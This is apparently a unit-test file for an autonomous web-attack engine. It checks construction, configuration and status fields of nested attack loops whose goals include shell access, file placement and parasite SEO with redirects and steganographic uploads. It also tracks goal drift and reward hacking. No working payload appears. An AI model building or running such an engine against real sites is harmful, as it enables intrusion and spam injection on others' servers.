/**
 * Tests for Autonomous Engine — 3-Layer Architecture
 * Unit tests for construction, configuration, types, and status methods
 * (Network-dependent tests excluded — those run via integration/E2E)
 */
import { describe, it, expect, vi } from "vitest";
import {
  AttackLoop,
  FixatedLoop,
  EmergentLoop,
  type AutonomousConfig,
  type AutonomousEvent,
  type AutonomousCallback,
} from "./autonomous-engine";

// ─── Test Helpers ───

function makeConfig(overrides: Partial<AutonomousConfig> = {}): AutonomousConfig {
  return {
    targetDomain: "test-target.com",
    targetUrl: "https://test-target.com",
    redirectUrl: "https://redirect.example.com",
    goal: "quick_test",
    maxWaves: 2,
    maxEpochs: 2,
    maxCycles: 2,
    proxies: [],
    seoKeywords: ["test", "keyword"],
    geoRedirect: true,
    parasiteEnabled: true,
    parasiteContentLength: "medium",
    parasiteRedirectDelay: 5,
    weightedRedirects: "",
    useAI: false,
    useStealth: false,
    useEnhancedUpload: false,
    ...overrides,
  };
}

function collectEvents(): { events: AutonomousEvent[]; callback: AutonomousCallback } {
  const events: AutonomousEvent[] = [];
  const callback: AutonomousCallback = (event) => {
    events.push(event);
  };
  return { events, callback };
}

// ─── Tests ───

describe("Autonomous Engine", () => {
  // ── AttackLoop ──
  describe("AttackLoop", () => {
    it("should construct with config and callback", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      expect(loop).toBeDefined();
      expect(loop.world).toBeDefined();
    });

    it("should have a world with initial empty state", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      const counts = loop.world.counts();
      expect(counts.hosts).toBe(0);
      expect(counts.ports).toBe(0);
      expect(counts.vulns).toBe(0);
      expect(counts.deployedFiles).toBe(0);
      expect(counts.verifiedUrls).toBe(0);
      expect(counts.shellUrls).toBe(0);
      expect(counts.uploadPaths).toBe(0);
      expect(counts.creds).toBe(0);
    });

    it("should support stop method without error", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      expect(() => loop.stop()).not.toThrow();
    });

    it("should store config correctly", () => {
      const config = makeConfig({ targetDomain: "custom.com", goal: "shell_access" });
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      // World should be empty initially
      expect(loop.world.counts().hosts).toBe(0);
    });
  });

  // ── FixatedLoop ──
  describe("FixatedLoop", () => {
    it("should construct with config and callback", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new FixatedLoop(config, callback);
      expect(loop).toBeDefined();
      expect(loop.loop).toBeDefined(); // inner AttackLoop
    });

    it("should support stop method", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new FixatedLoop(config, callback);
      expect(() => loop.stop()).not.toThrow();
    });

    it("should expose status method with correct fields", () => {
      const config = makeConfig({ targetDomain: "status-test.com", goal: "file_placement" });
      const { callback } = collectEvents();
      const loop = new FixatedLoop(config, callback);
      const status = loop.status();
      expect(status).toHaveProperty("target", "status-test.com");
      expect(status).toHaveProperty("goal", "file_placement");
      expect(status).toHaveProperty("wave");
      expect(status).toHaveProperty("escLevel");
      expect(status).toHaveProperty("totalCycles");
      expect(status).toHaveProperty("world");
      expect(status).toHaveProperty("elapsed");
    });

    it("should have inner AttackLoop with empty world", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new FixatedLoop(config, callback);
      const wc = loop.loop.world.counts();
      expect(wc.hosts).toBe(0);
      expect(wc.deployedFiles).toBe(0);
    });
  });

  // ── EmergentLoop ──
  describe("EmergentLoop", () => {
    it("should construct with config and callback", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new EmergentLoop(config, callback);
      expect(loop).toBeDefined();
      expect(loop.fixated).toBeDefined(); // inner FixatedLoop
    });

    it("should support stop method", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new EmergentLoop(config, callback);
      expect(() => loop.stop()).not.toThrow();
    });

    it("should expose status method with emergent tracking fields", () => {
      const config = makeConfig({ targetDomain: "emergent-test.com", goal: "parasite_seo" });
      const { callback } = collectEvents();
      const loop = new EmergentLoop(config, callback);
      const status = loop.status();
      expect(status).toHaveProperty("target", "emergent-test.com");
      expect(status).toHaveProperty("originalGoal", "parasite_seo");
      expect(status).toHaveProperty("currentGoal", "parasite_seo");
      expect(status).toHaveProperty("goalDrifted", false);
      expect(status).toHaveProperty("driftCount", 0);
      expect(status).toHaveProperty("hackCount", 0);
      expect(status).toHaveProperty("runawayScore", 0);
      expect(status).toHaveProperty("boundaryLevel", 100);
      expect(status).toHaveProperty("silentFails", 0);
      expect(status).toHaveProperty("committed", false);
      expect(status).toHaveProperty("epoch", 0);
    });

    it("should have nested loop hierarchy", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new EmergentLoop(config, callback);
      // EmergentLoop → FixatedLoop → AttackLoop → World
      expect(loop.fixated).toBeDefined();
      expect(loop.fixated.loop).toBeDefined();
      expect(loop.fixated.loop.world).toBeDefined();
      const wc = loop.fixated.loop.world.counts();
      expect(wc.hosts).toBe(0);
    });
  });

  // ── Config Validation ──
  describe("AutonomousConfig", () => {
    it("should accept all goal types", () => {
      const goals = ["full_deploy", "file_placement", "shell_access", "parasite_seo", "quick_test"] as const;
      for (const goal of goals) {
        const config = makeConfig({ goal });
        expect(config.goal).toBe(goal);
        // Should construct without error
        const { callback } = collectEvents();
        const loop = new AttackLoop(config, callback);
        expect(loop).toBeDefined();
      }
    });

    it("should accept method priority", () => {
      const config = makeConfig({
        methodPriority: [
          { id: "wp_media", enabled: true },
          { id: "direct_put", enabled: false },
          { id: "gif_stego", enabled: true },
        ],
      });
      expect(config.methodPriority).toHaveLength(3);
      expect(config.methodPriority![0].id).toBe("wp_media");
      expect(config.methodPriority![1].enabled).toBe(false);
    });

    it("should handle empty proxies and keywords", () => {
      const config = makeConfig({ proxies: [], seoKeywords: [] });
      expect(config.proxies).toHaveLength(0);
      expect(config.seoKeywords).toHaveLength(0);
    });

    it("should handle all content length options", () => {
      for (const len of ["short", "medium", "long"]) {
        const config = makeConfig({ parasiteContentLength: len });
        expect(config.parasiteContentLength).toBe(len);
      }
    });
  });

  // ── Event Types ──
  describe("AutonomousEvent types", () => {
    it("should accept all valid event types", () => {
      const validTypes = [
        "layer_start", "layer_complete", "phase_start", "phase_complete",
        "step_detail", "decision", "escalation", "adaptation",
        "goal_drift", "reward_hack", "silent_fail", "irreversible",
        "world_update", "module_exec", "error", "complete",
        "ai_reasoning", "progress",
      ];
      for (const type of validTypes) {
        const event: AutonomousEvent = { type: type as any };
        expect(event.type).toBe(type);
      }
    });

    it("should support layer field (1, 2, 3)", () => {
      const event1: AutonomousEvent = { type: "step_detail", layer: 1 };
      const event2: AutonomousEvent = { type: "step_detail", layer: 2 };
      const event3: AutonomousEvent = { type: "step_detail", layer: 3 };
      expect(event1.layer).toBe(1);
      expect(event2.layer).toBe(2);
      expect(event3.layer).toBe(3);
    });

    it("should support progress field (0-100)", () => {
      const event: AutonomousEvent = { type: "progress", progress: 50 };
      expect(event.progress).toBe(50);
    });

    it("should support optional fields", () => {
      const event: AutonomousEvent = {
        type: "phase_complete",
        layer: 2,
        phase: "wave_1",
        step: 3,
        totalSteps: 7,
        detail: "Wave 1 complete",
        data: { progress: 50 },
        timestamp: Date.now(),
        progress: 50,
      };
      expect(event.phase).toBe("wave_1");
      expect(event.step).toBe(3);
      expect(event.totalSteps).toBe(7);
      expect(event.data).toHaveProperty("progress", 50);
    });
  });

  // ── Callback Mechanism ──
  describe("Callback mechanism", () => {
    it("should accept vi.fn() as callback", () => {
      const config = makeConfig();
      const mockCallback = vi.fn();
      const loop = new AttackLoop(config, mockCallback);
      expect(loop).toBeDefined();
    });

    it("should accept arrow function as callback", () => {
      const config = makeConfig();
      const events: AutonomousEvent[] = [];
      const loop = new AttackLoop(config, (e) => events.push(e));
      expect(loop).toBeDefined();
    });
  });

  // ── World State ──
  describe("World State", () => {
    it("should provide counts method", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      const counts = loop.world.counts();
      expect(typeof counts.hosts).toBe("number");
      expect(typeof counts.ports).toBe("number");
      expect(typeof counts.vulns).toBe("number");
      expect(typeof counts.creds).toBe("number");
      expect(typeof counts.uploadPaths).toBe("number");
      expect(typeof counts.shellUrls).toBe("number");
      expect(typeof counts.deployedFiles).toBe("number");
      expect(typeof counts.verifiedUrls).toBe("number");
    });

    it("should provide summary method", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      const summary = loop.world.summary();
      expect(typeof summary).toBe("string");
      expect(summary.length).toBeGreaterThan(0);
    });

    it("should support addHost method", () => {
      const config = makeConfig();
      const { callback } = collectEvents();
      const loop = new AttackLoop(config, callback);
      loop.world.addHost("example.com");
      expect(loop.world.counts().hosts).toBe(1);
      // Adding same host should not duplicate
      loop.world.addHost("example.com");
      expect(loop.world.counts().hosts).toBe(1);
    });
  });
});
